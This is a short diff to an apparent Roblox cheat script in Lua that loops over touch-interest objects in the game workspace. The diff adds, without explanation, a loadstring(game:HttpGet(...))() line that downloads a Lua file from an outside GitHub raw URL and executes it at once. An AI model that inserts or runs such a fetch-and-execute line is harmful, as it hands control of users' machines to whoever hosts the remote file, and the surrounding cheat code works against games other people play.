@@ -1,4 +1,5 @@
 print("Activated!")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ZinaGoreng/siu/main/notif.lua"))()
 wait(7)
              for _, v in pairs(game.Workspace:GetDescendants()) do
                   if v:IsA("TouchTransmitter") or v:IsA("TouchInterest") then
